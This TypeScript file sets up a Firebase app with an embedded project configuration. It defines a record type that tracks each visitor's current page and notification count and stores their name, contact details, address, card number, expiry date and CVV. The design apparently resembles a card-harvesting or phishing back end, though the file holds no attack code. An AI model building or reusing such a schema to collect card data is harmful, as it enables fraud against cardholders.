import { initializeApp, getApps, getApp } from 'firebase/app';
import { getAuth } from 'firebase/auth';
import { getFirestore } from 'firebase/firestore';

const firebaseConfig = {
  apiKey: 'AIzaSyBUEG9HRX2uAa_Lj8toAimFqLqCErV2R9w',
  authDomain: 'ammmmm-53c27.firebaseapp.com',
  projectId: 'ammmmm-53c27',
  storageBucket: 'ammmmm-53c27.firebasestorage.app',
  messagingSenderId: '119045205620',
  appId: '1:119045205620:web:a12e69efb14afb411a6b21',
  measurementId: 'G-XRS6V15L73',
};

const app = getApps().length > 0 ? getApp() : initializeApp(firebaseConfig);
const auth = getAuth(app);
const db = getFirestore(app);

export { app, auth, db };

export interface NotificationDocument {
  id: string;
  name: string;
  hasPersonalInfo: boolean;
  hasCardInfo: boolean;
  currentPage: string;
  time: string;
  notificationCount: number;
  personalInfo?: {
    fullName: string;
    email: string;
    phone: string;
    address: string;
  };
  cardInfo?: {
    cardNumber: string;
    expirationDate: string;
    cvv: string;
  };
}
